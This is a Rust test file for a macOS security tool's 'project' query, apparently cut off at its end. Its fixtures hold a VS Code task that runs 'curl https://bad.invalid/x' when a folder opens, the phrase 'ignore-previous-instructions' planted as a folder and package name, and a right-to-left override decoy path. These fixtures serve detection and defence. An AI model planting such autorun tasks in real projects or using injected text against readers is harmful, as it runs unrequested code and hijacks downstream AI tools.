//! Promises of `immune project`, the first command of the contract: what the store knows of one
//! project, as one protobuf message or the same message as JSON. Each test runs the real binary
//! over an invented home folder and an invented system root, so no test reads anything of the
//! Mac it runs on or asks the network.

#[path = "../src/contract.rs"]
#[allow(dead_code)]
mod contract;

use contract::v1;
use prost::Message;
use serde_json::Value;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

/// An invented home folder, which also holds the store.
struct Home(PathBuf);

impl Home {
    fn new(tag: &str) -> Home {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "immune-project-{tag}-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir_all(&path).unwrap();
        // Made real, as the readers make the home folder real: the temporary folder is a link.
        Home(std::fs::canonicalize(path).unwrap())
    }

    fn path(&self) -> &Path {
        &self.0
    }

    fn store(&self) -> PathBuf {
        self.0.join("store.db")
    }

    fn put(&self, rel: &str, content: &str) {
        let path = self.0.join(rel);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, content).unwrap();
    }

    /// A checkout as git leaves it.
    fn checkout(&self, rel: &str) {
        self.put(&format!("{rel}/.git/HEAD"), "ref: refs/heads/main\n");
        self.put(
            &format!("{rel}/.git/refs/heads/main"),
            "0123456789abcdef0123456789abcdef01234567\n",
        );
    }

    /// The binary with this home folder as the home and the working folder.
    fn immune(&self) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_immune"));
        cmd.env("HOME", &self.0).current_dir(&self.0);
        cmd
    }

    /// `immune run` for the machine `mac`, with every outside source pointed at nothing, and
    /// these arguments after.
    fn run(&self, extra: &[&str]) {
        let no = |name: &str| self.0.join(name);
        self.put("brew.json", r#"{"formulae": [], "casks": []}"#);
        let out = self
            .immune()
            .args(["run", "--machine-name", "mac", "--store"])
            .arg(self.store())
            .arg("--brew-input")
            .arg(no("brew.json"))
            .arg("--servers-input")
            .arg(no("no-sweep"))
            .arg("--tailscale")
            .arg(no("no-tailscale"))
            .arg("--threats-input")
            .arg(no("no-catalogue"))
            .arg("--osv-crates-input")
            .arg(no("osv-crates.zip"))
            .arg("--osv-npm-input")
            .arg(no("osv-npm.zip"))
            .arg("--system-root")
            .arg(no("no-system"))
            .args(extra)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// `immune project <what>` on this store, with these arguments after.
    fn project(&self, what: &str, extra: &[&str]) -> Output {
        self.immune()
            .args(["project", what, "--store"])
            .arg(self.store())
            .args(extra)
            .output()
            .unwrap()
    }

    /// The answer in binary, decoded with the generated types.
    fn known(&self, what: &str) -> v1::Known {
        let out = self.project(what, &[]);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        v1::Known::decode(out.stdout.as_slice()).unwrap()
    }

    /// The answer as JSON.
    fn json(&self, what: &str) -> Value {
        let out = self.project(what, &["--json"]);
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        serde_json::from_slice(&out.stdout).unwrap()
    }
}

impl Drop for Home {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

/// A lockfile of npm declaring one package.
fn package_lock(package: &str) -> String {
    format!(
        "{{\"name\": \"shop\", \"lockfileVersion\": 3, \"packages\": {{\"\": {{\"name\": \"shop\"}}, \
         \"node_modules/{package}\": {{\"version\": \"1.3.0\"}}}}}}\n"
    )
}

/// What the answer says of its project in a word: how it is known, and whether every reading
/// that speaks for it was full.
fn standing(k: &v1::Known) -> (v1::Presence, bool) {
    let all_full = k
        .coverage
        .iter()
        .all(|c| c.completeness() == v1::Completeness::Full);
    (k.presence(), all_full)
}

fn find<'a>(k: &'a v1::Known, reader: &str, kind: &str) -> Option<&'a v1::Coverage> {
    k.coverage
        .iter()
        .find(|c| c.reader == reader && c.kind == kind)
}

const GUARDED: &str = "folders macOS asks permission for";

/// The promise against false calm: a project the store never heard of, a project read in full
/// with nothing found, and a project in a folder macOS asks permission for, known from before and
/// not read now, are three different answers. The third carries the reading that says the folder
/// was not looked into, though everything read there before was read in full.
#[test]
fn unknown_known_and_quiet_and_known_but_not_read_are_three_different_answers() {
    let h = Home::new("three");
    h.checkout("dev/shop");
    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
    h.checkout("Documents/notes");
    h.put(
        "Documents/notes/package-lock.json",
        &package_lock("left-pad"),
    );
    // Pointed at the guarded folder on purpose, the walk reads the project there; the next
    // walk of the home folder does not enter it, and keeps the project with nothing read.
    let documents = h.path().join("Documents");
    h.run(&["--checkouts-root", documents.to_str().unwrap()]);
    h.run(&[]);

    let unknown = h.known("~/dev/ghost");
    let quiet = h.known("~/dev/shop");
    let not_read = h.known("~/Documents/notes");

    assert_eq!(unknown.presence(), v1::Presence::Unknown);
    assert_eq!(unknown.thing, None);
    assert!(unknown.facts.is_empty() && unknown.parts.is_empty());
    // Unknown says which readings looked for it: the walk of this Mac.
    let walk = find(&unknown, "checkouts", "checkouts under the home folder").unwrap();
    assert_eq!(walk.scope_text, "machine:mac");

    assert_eq!(standing(&quiet), (v1::Presence::Held, true));
    assert!(quiet.findings.is_empty());
    // A reading of the project that found nothing is in the answer as well as one that did.
    let hooks = find(
        &quiet,
        "watched-places",
        "hooks in the checkout's .git folder",
    )
    .unwrap();
    assert_eq!(
        (hooks.scope_text.as_str(), hooks.reason_text.as_deref()),
        (
            "checkout:machine:mac/dev/shop",
            Some("the checkout has no hooks")
        )
    );
    assert_eq!(
        quiet.thing,
        Some(v1::Entity {
            id_text: "checkout:machine:mac/dev/shop".to_string(),
            r#type: "checkout".to_string(),
        })
    );

    assert_eq!(standing(&not_read), (v1::Presence::Held, false));
    let guarded = not_read
        .coverage
        .iter()
        .find(|c| c.kind == GUARDED && c.reader == "checkouts")
        .unwrap();
    assert_eq!(guarded.completeness(), v1::Completeness::None);
    assert_eq!(guarded.cause(), v1::Cause::NotGiven);
    assert_eq!(
        guarded.reason_text.as_deref(),
        Some("not looked into: ~/Documents")
    );
    // What was read there before is still given, with when it was read.
    let lockfiles = find(&not_read, "lockfiles", "lockfile dependencies").unwrap();
    assert_eq!(lockfiles.completeness(), v1::Completeness::Full);
    // The project outside the guarded folder is not spoken for by that reading.
    assert!(quiet.coverage.iter().all(|c| c.kind != GUARDED));
    // A project the store never heard of in a folder that was not looked into is unknown for
    // that reason, and says so.
    let unseen = h.known("~/Documents/unseen");
    assert_eq!(unseen.presence(), v1::Presence::Unknown);
    assert!(
        unseen
            .coverage
            .iter()
            .any(|c| c.kind == GUARDED && c.completeness() == v1::Completeness::None)
    );

    // The project's id as the store names it, its full path, and a path with `..` and a
    // trailing `/` are the same question as its path from the home folder.
    let full = h.path().join("dev/tools/../shop/");
    for what in ["checkout:machine:mac/dev/shop", full.to_str().unwrap()] {
        let same = h.known(what);
        assert_eq!(
            (&same.thing, &same.facts, &same.coverage),
            (&quiet.thing, &quiet.facts, &quiet.coverage),
            "{what}"
        );
    }
}

/// A project the store held and that is no longer there is gone, not unknown: what was read of
/// it is retracted, and the answer does not pass for one about a project never seen.
#[test]
fn a_project_that_was_removed_is_gone_not_unknown() {
    let h = Home::new("gone");
    h.checkout("dev/old");
    h.run(&[]);
    std::fs::remove_dir_all(h.path().join("dev/old")).unwrap();
    h.run(&[]);
    let k = h.known("~/dev/old");
    assert_eq!(k.presence(), v1::Presence::Gone);
    assert!(k.facts.is_empty());
    assert_eq!(k.thing.unwrap().id_text, "checkout:machine:mac/dev/old");
}

/// Every fact says what it rests on: the reader, the basis and where it was read. A reading that
/// was not full is in the answer with its cause and what this build has no reader for.
#[test]
fn facts_carry_their_basis_and_reader_and_coverage_that_is_not_full_is_in_the_answer() {
    let h = Home::new("basis");
    h.checkout("dev/shop");
    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
    h.put("dev/shop/web/yarn.lock", "# yarn lockfile v1\n");
    h.run(&[]);
    let k = h.known("~/dev/shop");
    let component = "component:checkout:machine:mac/dev/shop/npm/left-pad";
    assert!(k.parts.iter().any(|p| p.id_text == component));
    let version = k
        .facts
        .iter()
        .find(|f| f.subject_text == component && f.predicate == "has_version")
        .unwrap();
    assert_eq!(version.object_text, "1.3.0");
    let a = &version.assertions[0];
    assert_eq!(
        (a.reader.as_str(), a.basis(), a.kind.as_str()),
        ("lockfiles", v1::Basis::Declared, "lockfile dependencies")
    );
    assert!(a.source_ref_text.contains("package-lock.json"));
    let located = k
        .facts
        .iter()
        .find(|f| f.subject_text == "checkout:machine:mac/dev/shop" && f.predicate == "located_on")
        .unwrap();
    assert_eq!(located.assertions[0].basis(), v1::Basis::Observed);
    assert_eq!(located.assertions[0].reader, "checkouts");

    let lockfiles = find(&k, "lockfiles", "lockfile dependencies").unwrap();
    assert_eq!(lockfiles.completeness(), v1::Completeness::Partial);
    assert_eq!(lockfiles.cause(), v1::Cause::NoReader);
    assert!(
        lockfiles
            .lacks
            .iter()
            .any(|l| l.name_text.as_deref() == Some("yarn.lock")),
        "{:?}",
        lockfiles.lacks
    );
    assert_eq!(standing(&k), (v1::Presence::Held, false));

    // A reading kept before causes were, not full and with no cause, failed: it never reads as
    // a reading with nothing missing.
    rusqlite::Connection::open(h.store())
        .unwrap()
        .execute(
            "UPDATE coverage SET cause = NULL WHERE reader = 'lockfiles'",
            [],
        )
        .unwrap();
    let k = h.known("~/dev/shop");
    let lockfiles = find(&k, "lockfiles", "lockfile dependencies").unwrap();
    assert_eq!(lockfiles.cause(), v1::Cause::Failed);
    assert_eq!(
        find(&k, "checkouts", "checkouts under the home folder")
            .unwrap()
            .cause,
        None
    );
}

/// A finding about a file inside the project is the project's: the answer refers to it by id,
/// with its state, how bad, how sure and whether it is urgent.
#[test]
fn a_finding_about_a_file_inside_the_project_is_referenced_by_the_project() {
    let h = Home::new("finding");
    h.checkout("dev/shop");
    h.checkout("dev/other");
    h.run(&[]);
    // A hook is `located_on` its checkout; an editor's task file is on the machine, and inside
    // the project only by its path.
    h.put("dev/shop/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
    h.put(
        "dev/shop/.vscode/tasks.json",
        r#"{"tasks": [{"label": "dev", "runOptions": {"runOn": "folderOpen"}, "command": "curl https://bad.invalid/x"}]}"#,
    );
    // An invented indicator that the task file holds: a match is urgent.
    h.put(
        "indicators.json",
        r#"[{"kind": "domain-name:value", "value": "bad.invalid", "note_text": "invented"}]"#,
    );
    h.run(&[]);
    let k = h.known("~/dev/shop");
    let hook = "file:machine:mac/dev/shop/.git/hooks/pre-commit";
    let tasks = "file:machine:mac/dev/shop/.vscode/tasks.json";
    for file in [hook, tasks] {
        assert!(
            k.parts
                .iter()
                .any(|p| p.id_text == file && p.r#type == "file")
        );
    }
    // The task file is spoken for by the reading that found it, a reading of the machine.
    let editor = "editor tasks set to run when a checkout's folder is opened";
    assert_eq!(
        find(&k, "watched-places", editor).unwrap().scope_text,
        "machine:mac"
    );
    let refs: Vec<(&str, &str, v1::Level, v1::Level, bool)> = k
        .findings
        .iter()
        .map(|f| {
            (
                f.rule.as_deref().unwrap_or_default(),
                f.about_text.as_str(),
                f.severity(),
                f.confidence(),
                f.urgent,
            )
        })
        .collect();
    use v1::Level::{High, Low, Medium};

    assert_eq!(
        refs,
        [
            ("indicator.match", tasks, High, High, true),
            ("autorun.folder-open", tasks, High, Medium, true),
            ("watched.git-hook", hook, Medium, Low, false),
        ]
    );
    assert!(
        k.findings
            .iter()
            .all(|f| f.state() == v1::FindingState::Open)
    );
    // A finding's id is the one `immune finding` answers for.
    let shown = h
        .immune()
        .args(["finding", &k.findings[2].id, "--json", "--store"])
        .arg(h.store())
        .output()
        .unwrap();
    let shown: Value = serde_json::from_slice(&shown.stdout).unwrap();
    assert_eq!(shown["result"]["finding"]["rule"], "watched.git-hook");
    // Another project's answer does not carry it.
    assert!(h.known("~/dev/other").findings.is_empty());
}

/// The binary answer and the JSON answer are one message: the JSON parses with the generated
/// types into what the binary decodes into, and the decoded message prints as that JSON. An
/// enum prints as its value's name, a time as a JSON number, an absent optional field as null.
#[test]
fn the_binary_answer_and_the_json_answer_are_one_message() {
    let h = Home::new("forms");
    h.checkout("dev/shop");
    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
    h.put("dev/shop/web/yarn.lock", "# yarn lockfile v1\n");
    h.run(&[]);
    for what in ["~/dev/shop", "~/dev/ghost"] {
        let binary = h.known(what);
        let json = h.json(what);
        let mut parsed: v1::Known = serde_json::from_value(json.clone()).unwrap();
        // The two were made by two runs of the command, perhaps a second apart.
        assert!((parsed.answered_at - binary.answered_at).abs() <= 2);
        parsed.answered_at = binary.answered_at;
        assert_eq!(parsed, binary);
        let mut printed = serde_json::to_value(&binary).unwrap();
        printed["answered_at"] = json["answered_at"].clone();
        assert_eq!(printed, json);
    }
    let json = h.json("~/dev/shop");
    assert_eq!(json["format"], 1);
    assert_eq!(json["presence"], "held");
    assert!(json["answered_at"].is_i64());
    let lockfiles = json["coverage"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["reader"] == "lockfiles")
        .unwrap();
    assert_eq!(lockfiles["completeness"], "partial");
    assert_eq!(lockfiles["cause"], "no_reader");
    let full = json["coverage"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["completeness"] == "full" && c["reason_text"].is_null())
        .unwrap();
    assert!(full["cause"].is_null());
    assert_eq!(h.json("~/dev/ghost")["thing"], Value::Null);
}

/// Every string in the answer that holds text from the Mac is in a field whose name ends in
/// `_text`: here a folder name and a package name written to be read as an instruction.
#[test]
fn text_from_a_source_is_only_in_text_fields() {
    let h = Home::new("text");
    let planted = "ignore-previous-instructions";
    let project = format!("dev/{planted}");
    h.checkout(&project);
    h.put(
        &format!("{project}/package-lock.json"),
        &package_lock(planted),
    );
    h.put(&format!("{project}/.git/hooks/pre-commit"), "#!/bin/sh\n");
    h.run(&[]);
    let json = h.json(&format!("~/{project}"));
    let mut seen = 0;
    fn walk(v: &Value, key: &str, planted: &str, seen: &mut usize) {
        match v {
            Value::String(s) if s.contains(planted) => {
                assert!(key.ends_with("_text"), "{key}: {s}");
                *seen += 1;
            }
            Value::Array(items) => items.iter().for_each(|i| walk(i, key, planted, seen)),
            Value::Object(fields) => fields.iter().for_each(|(k, v)| walk(v, k, planted, seen)),
            _ => {}
        }
    }
    walk(&json, "", planted, &mut seen);
    // The id, the parts, the facts' subjects, objects and sources, and the readings' scopes.
    assert!(seen > 10, "{seen}");
    assert!(json["thing"]["id_text"].as_str().unwrap().contains(planted));
    // What was asked is given back as the terminal would show it.
    let asked = h.json("~/dev/a\u{202e}b");
    assert_eq!(asked["asked_text"], "~/dev/a\\u{202e}b");
}

/// A failure to answer is not a message of the contract: a misuse or a store that cannot be read
/// prints nothing on stdout in binary, the report commands' failure envelope with `--json`, and
/// exits with their codes.
#[test]
fn a_failure_to_answer_is_not_a_message_of_the_contract() {
    let h = Home::new("failure");
    // No store yet.
    let out = h.project("~/dev/shop", &[]);
    assert_eq!(out.status.code(), Some(3));
    assert!(out.stdout.is_empty());
    assert!(String::from_utf8_lossy(&out.stderr).contains("`immune run` makes it"));
    let out = h.project("~/dev/shop", &["--json"]);
    assert_eq!(out.status.code(), Some(3));
    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(
        (&v["ok"], &v["operation"], &v["errors"][0]["code"]),
        (
            &Value::Bool(false),
            &Value::from("project"),
            &Value::from("store_unreadable")
        )
    );
    // A relative path names no folder on this Mac.
    let out = h.project("dev/shop", &[]);
    assert_eq!(out.status.code(), Some(2));
    assert!(out.stdout.is_empty());
    let out = h.project("dev/shop", &["--json"]);
    assert_eq!(out.status.code(), Some(2));
    let v: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(v["errors"][0]["code"], "usage");
    // Parsed as an answer all the same, neither failure is one: it has no format, and reads
    // as format 0, which a reader stops at.
    for args in [&["--json"][..], &["--json", "--store", "elsewhere.db"][..]] {
        for what in ["dev/shop", "~/dev/shop"] {
            let out = h.ask("project", Some(what), args);
            assert_ne!(out.status.code(), Some(0));
            let v: Value = serde_json::from_slice(&out.stdout).unwrap();
            assert!(v.get("format").is_none(), "{v}");
            let parsed: v1::Known = serde_json::from_value(v).unwrap();
            assert_eq!(parsed.format, 0);
        }
    }
    // A store written by an older build, without a table a run of this build adds, is told as
    // such, with what to do.
    h.checkout("dev/shop");
    h.run(&[]);
    rusqlite::Connection::open(h.store())
        .unwrap()
        .execute_batch("DROP TABLE coverage_lack")
        .unwrap();
    let out = h.project("~/dev/shop", &[]);
    assert_eq!(out.status.code(), Some(3));
    assert!(out.stdout.is_empty());
    let said = String::from_utf8_lossy(&out.stderr);
    assert!(
        said.contains("written by an older build")
            && said.contains("`immune run` brings it up to date"),
        "{said}"
    );
}

/// A reference is given whole: an entity id longer than the 256 characters other text from a
/// source is cut to stays whole, the same in a part, a fact and a finding, and asks back the
/// same thing.
#[test]
fn an_entity_id_is_given_whole_and_asks_back_the_same_thing() {
    let h = Home::new("whole");
    let project = format!("dev/{}/{}", "a".repeat(150), "b".repeat(120));
    h.checkout(&project);
    h.run(&[]);
    h.put(&format!("{project}/.git/hooks/pre-commit"), "#!/bin/sh\n");
    h.run(&[]);
    let k = h.known(&format!("~/{project}"));
    // What was asked is given back whole as well.
    assert_eq!(k.asked_text, format!("~/{project}"));
    let hook = format!("file:machine:mac/{project}/.git/hooks/pre-commit");
    assert!(hook.chars().count() > 256);
    assert!(k.parts.iter().any(|p| p.id_text == hook));
    assert!(k.facts.iter().filter(|f| f.subject_text == hook).count() >= 2);
    assert_eq!(k.findings[0].about_text, hook);
    let thing = k.thing.unwrap();
    assert_eq!(thing.id_text, format!("checkout:machine:mac/{project}"));
    assert_eq!(h.known(&thing.id_text).thing, Some(thing));
}

/// An editor task that runs when its folder is opened and calls out to an invented address.
const TASK: &str = r#"{"tasks": [{"label": "dev", "runOptions": {"runOn": "folderOpen"}, "command": "curl https://bad.invalid/x"}]}"#;

impl Home {
    /// `immune <question> [<what>] --store <store>` with these arguments after.
    fn ask(&self, question: &str, what: Option<&str>, extra: &[&str]) -> Output {
        self.immune()
            .arg(question)
            .args(what)
            .arg("--store")
            .arg(self.store())
            .args(extra)
            .output()
            .unwrap()
    }

    /// A refusal: exit 2, and the JSON envelope's error. The envelope has no format, so it is
    /// never read as an answer.
    fn refused(&self, what: &str) -> Value {
        let out = self.project(what, &["--json"]);
        assert_eq!(out.status.code(), Some(2), "{what}");
        let v: Value = serde_json::from_slice(&out.stdout).unwrap();
        assert!(v.get("format").is_none(), "{v}");
        v["errors"][0].clone()
    }
}

/// The reading made by rule that says no reading looks at the place asked about.
fn unread(k: &v1::Known) -> Option<&v1::Coverage> {
    k.coverage.iter().find(|c| c.reader == "immune")
}

/// The promise that a finding does not vanish with what it is about: removing the files two
/// findings are about retracts what was read of them, and the findings, still open, stay in the
/// project's answer and, for the file on this Mac, in the Mac's.
#[test]
fn a_finding_stays_in_the_answer_after_the_file_it_is_about_is_removed() {
    let h = Home::new("removed");
    h.checkout("dev/shop");
    // A project beside it, whose finding is not this project's.
    h.checkout("dev/shop2");
    h.run(&[]);
    h.put("dev/shop/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
    h.put("dev/shop/.vscode/tasks.json", TASK);
    h.put("dev/shop2/.vscode/tasks.json", TASK);
    h.run(&[]);
    let before = h.known("~/dev/shop").findings;
    assert_eq!(before.len(), 2);
    std::fs::remove_file(h.path().join("dev/shop/.git/hooks/pre-commit")).unwrap();
    std::fs::remove_file(h.path().join("dev/shop/.vscode/tasks.json")).unwrap();
    h.run(&[]);
    let after = h.known("~/dev/shop");
    assert!(
        after.parts.iter().all(|p| p.r#type != "file"),
        "{:?}",
        after.parts
    );
    assert_eq!(after.findings, before);
    assert!(
        after
            .findings
            .iter()
            .all(|f| f.state() == v1::FindingState::Open)
    );
    let out = h.ask("machine", None, &[]);
    let mac = v1::Known::decode(out.stdout.as_slice()).unwrap();
    let tasks = "file:machine:mac/dev/shop/.vscode/tasks.json";
    assert!(mac.findings.iter().any(|f| f.about_text == tasks));
}

/// A path inside a project the store knows, such as the working folder of a program that ran
/// there, answers for that project, the nearest one that holds it; the answer says what was
/// asked. A folder beside the project is not in it.
#[test]
fn a_path_inside_a_known_project_answers_for_the_nearest_project_that_holds_it() {
    let h = Home::new("inside");
    h.checkout("dev/shop");
    h.put("dev/shop/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
    // A checkout inside another is not walked into; an agent's working folder names it.
    h.checkout("dev/shop/tools/gen");
    let gen_dir = h.path().join("dev/shop/tools/gen");
    h.put(
        ".claude/projects/one/session.jsonl",
        &format!("{{\"cwd\": \"{}\"}}\n", gen_dir.display()),
    );
    h.run(&[]);
    let shop = "checkout:machine:mac/dev/shop";
    let gen_id = "checkout:machine:mac/dev/shop/tools/gen";
    for (asked, id) in [
        ("~/dev/shop/src/lib", shop),
        ("~/dev/shop/README.md", shop),
        ("file:machine:mac/dev/shop/src/main.rs", shop),
        // A file the store holds, by its id.
        ("file:machine:mac/dev/shop/.git/hooks/pre-commit", shop),
        ("~/dev/shop/tools", shop),
        ("~/dev/shop/tools/gen/src", gen_id),
    ] {
        let k = h.known(asked);
        assert_eq!(k.presence(), v1::Presence::Held, "{asked}");
        assert_eq!(k.thing.unwrap().id_text, id, "{asked}");
        assert_eq!(k.asked_text, asked);
    }
    assert_eq!(h.known("~/dev/shopping").presence(), v1::Presence::Unknown);
}

/// The promise against false calm for the same folder spelled another way: on a volume that
/// ignores case `~/dev/shop` may be `~/dev/Shop`, so it is refused with the id the store knows,
/// never answered `unknown`; a link to the project answers for the project; and a link into a
/// folder macOS asks permission for carries the reading that says it was not looked into.
#[test]
fn the_same_folder_spelled_another_way_is_never_unknown_with_every_reading_full() {
    let h = Home::new("spelled");
    h.checkout("dev/Shop");
    h.checkout("Documents/notes");
    let link = |to: &str, name: &str| {
        std::os::unix::fs::symlink(h.path().join(to), h.path().join(name)).unwrap();
    };
    link("dev/Shop", "shop-link");
    link("Documents/notes", "notes-link");
    h.run(&[]);
    for asked in ["~/dev/shop", "~/DEV/SHOP/src"] {
        let error = h.refused(asked);
        assert_eq!(error["code"], "spelled_otherwise", "{asked}");
        assert_eq!(
            error["ids_text"],
            serde_json::json!(["checkout:machine:mac/dev/Shop"])
        );
    }
    for asked in ["~/shop-link", "~/shop-link/src"] {
        let k = h.known(asked);
        assert_eq!(
            k.thing.unwrap().id_text,
            "checkout:machine:mac/dev/Shop",
            "{asked}"
        );
        assert_eq!(k.asked_text, asked);
    }
    let linked = h.known("~/notes-link");
    assert_eq!(linked.presence(), v1::Presence::Unknown);
    let guarded = linked
        .coverage
        .iter()
        .find(|c| c.kind == GUARDED && c.reader == "checkouts")
        .unwrap();
    assert_eq!(
        (guarded.completeness(), guarded.reason_text.as_deref()),
        (v1::Completeness::None, Some("not looked into: ~/Documents"))
    );
}

/// The promise against false calm for a place no reading looks at: a path outside the home
/// folder, on another volume, in a hidden folder, deeper than the walk goes or in a folder the
/// walk skips answers `unknown` with a reading made by rule that is not full, never with every
/// reading full. A path the walk does look at has no such reading.
#[test]
fn a_path_no_reading_looks_at_is_never_unknown_with_every_reading_full() {
    let h = Home::new("unread");
    h.checkout("dev/shop");
    h.run(&[]);
    for asked in [
        "/opt/src/proj",
        "/Volumes/External/proj",
        "~/.hidden/proj",
        "~/a/b/c/d/e/proj",
        "~/Library/proj",
        "~/dev/node_modules/proj",
    ] {
        let k = h.known(asked);
        assert_eq!(standing(&k), (v1::Presence::Unknown, false), "{asked}");
        let rule = unread(&k).unwrap();
        assert_eq!(
            (
                rule.kind.as_str(),
                rule.scope_text.as_str(),
                rule.completeness(),
                rule.cause(),
                rule.observed_at,
            ),
            (
                "places the readings that find projects look in",
                "machine:mac",
                v1::Completeness::None,
                v1::Cause::NotGiven,
                None
            ),
            "{asked}"
        );
        assert!(
            rule.reason_text
                .as_deref()
                .unwrap()
                .starts_with("no reading")
        );
    }
    let looked = h.known("~/dev/ghost");
    assert_eq!(standing(&looked), (v1::Presence::Unknown, true));
    assert!(unread(&looked).is_none());
    assert!(looked.coverage.iter().all(|c| c.observed_at.is_some()));
}

/// The promise that a project's answer carries the readings that read inside every project: a
/// task file that could not be read in another project leaves this one's answer not full, since
/// the reading of task files is one reading of every checkout on this Mac.
#[test]
fn a_project_carries_the_readings_that_read_inside_every_project() {
    let h = Home::new("inside-readings");
    h.checkout("dev/shop");
    h.checkout("dev/other");
    h.put("dev/other/.vscode/tasks.json", "{not json");
    h.run(&[]);
    let k = h.known("~/dev/shop");
    assert_eq!(standing(&k), (v1::Presence::Held, false));
    let editor = "editor tasks set to run when a checkout's folder is opened";
    let tasks = find(&k, "watched-places", editor).unwrap();
    assert_eq!(
        (tasks.scope_text.as_str(), tasks.completeness()),
        ("machine:mac", v1::Completeness::None)
    );
    // The other readings of every checkout are there too, read in full, and none of the home
    // folder's own.
    for kind in [
        "package.json of each checkout, the part that runs by itself",
        "ways a checkout runs code by itself, as present in each",
        "other ways a checkout runs code by itself",
    ] {
        assert!(find(&k, "watched-places", kind).is_some(), "{kind}");
    }
    let home = "~/.claude/settings.json, the part that runs by itself";
    assert!(find(&k, "watched-places", home).is_none());
    // A project the store never heard of is not spoken for by them.
    assert!(find(&h.known("~/dev/ghost"), "watched-places", editor).is_none());
}

/// A coverage reason is given whole, however long: the end of a reason can be what was not read.
#[test]
fn a_coverage_reason_is_given_whole() {
    let h = Home::new("reason");
    let project = format!("dev/{}/{}", "a".repeat(150), "b".repeat(120));
    h.checkout(&project);
    h.put(&format!("{project}/.vscode/tasks.json"), "{not json");
    h.run(&[]);
    let k = h.known(&format!("~/{project}"));
    let kind = "editor tasks set to run when a checkout's folder is opened";
    let given = find(&k, "watched-places", kind)
        .unwrap()
        .reason_text
        .clone()
        .unwrap();
    let kept: String = rusqlite::Connection::open(h.store())
        .unwrap()
        .query_row(
            "SELECT reason FROM coverage WHERE kind = ?1 ORDER BY id DESC LIMIT 1",
            [kind],
            |r| r.get(0),
        )
        .unwrap();
    assert!(kept.chars().count() > 256);
    assert_eq!(given, kept);
}

/// An id the store holds that is not a project is refused, not answered as a project never heard
/// of: a package of a project, or a machine. An id of no kind the question takes is a misuse.
#[test]
fn an_id_of_another_kind_is_refused_not_unknown() {
    let h = Home::new("other-kind");
    h.checkout("dev/shop");
    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
    h.run(&[]);
    for id in [
        "component:checkout:machine:mac/dev/shop/npm/left-pad",
        "machine:mac",
    ] {
        let error = h.refused(id);
        assert_eq!(error["code"], "not_a_project", "{id}");
        assert_eq!(error["ids_text"], serde_json::json!([id]));
    }
    assert_eq!(h.refused("component:nothing")["code"], "usage");
}

/// The contract's text is one-to-one: a folder whose name holds a hidden character and a folder
/// whose name spells that character's escape out are shown apart, and each id, given back as
/// shown, asks for its own project and not the decoy. A path is given as the contract shows
/// text, so the decoy's own path is asked with its backslash escaped.
#[test]
fn an_id_given_back_as_shown_asks_for_its_own_thing_and_never_the_decoy() {
    let h = Home::new("decoy");
    let hidden = "dev/a\u{202e}b";
    h.checkout(hidden);
    h.checkout("dev/a\\u{202e}b");
    h.run(&[]);
    let real = h.known(&format!("~/{hidden}")).thing.unwrap();
    let spelled = h.known("~/dev/a\\u{5c}u{202e}b").thing.unwrap();
    assert_eq!(real.id_text, "checkout:machine:mac/dev/a\\u{202e}b");
    assert_eq!(spelled.id_text, "checkout:machine:mac/dev/a\\u{5c}u{202e}b");
    for thing in [&real, &spelled] {
        assert_eq!(h.known(&thing.id_text).thing.as_ref(), Some(thing));
    }
}

/// The two functions the contract's text is made with undo each other, whatever counts as
/// hidden, and two texts never show alike.
#[test]
fn escaping_the_contracts_text_is_one_to_one() {
    let hidden = |c: char| c.is_control() || c == '\u{202e}';
    let texts = [
        "plain",
        "a\u{202e}b",
        "a\\u{202e}b",
        "\\",
        "\\u{",
        "\\u{zz}",
        "\\u{110000}",
        "\\u{d800}",
        "tab\there",
    ];
    let mut shown: Vec<String> = Vec::new();
    for text in texts {
        let s = contract::escape(text, hidden);
        assert_eq!(contract::unescape(&s), text, "{s}");
        assert!(!shown.contains(&s), "{s}");
        shown.push(s);
    }
    assert_eq!(contract::escape("a\\b", hidden), "a\\u{5c}b");
    // What names no character is kept as written.
    for written in ["\\u{+41}", "\\u{zz}", "\\u{}", "\\u{d800}", "a\\b"] {
        assert_eq!(contract::unescape(written), written);
    }
    assert_eq!(contract::unescape("\\u{41}\\u{5c}"), "A\\");
}

/// An older reader meets a newer core: a word for an enum value this build does not know reads
/// as the enum's unspecified value, which the schema says to read as the unsafe case, and the
/// rest of the message is read.
#[test]
fn an_enum_word_this_build_does_not_know_reads_as_unspecified() {
    let json = r#"{"format": 1, "presence": "someday", "asked_text": "~/dev/x",
        "coverage": [{"reader": "r", "completeness": "most", "cause": "new_cause"}],
        "findings": [{"id": "f1", "state": "snoozed", "severity": "dire", "confidence": "odd"}]}"#;
    let k: v1::Known = serde_json::from_str(json).unwrap();
    assert_eq!(
        (k.format, k.presence, k.asked_text.as_str()),
        (1, 0, "~/dev/x")
    );
    let c = &k.coverage[0];
    assert_eq!((c.completeness, c.cause), (0, Some(0)));
    let f = &k.findings[0];
    assert_eq!((f.state, f.severity, f.confidence), (0, 0, Some(0)));
}

/// What was asked is in the answer: which question, and for a project no other ids, so a reader
/// tells an unknown project from an unknown program or machine. The end of the latest run is
/// given, so a reading older than it shows.
#[test]
fn an_answer_says_which_question_it_answers_and_when_the_latest_run_ended() {
    let h = Home::new("question");
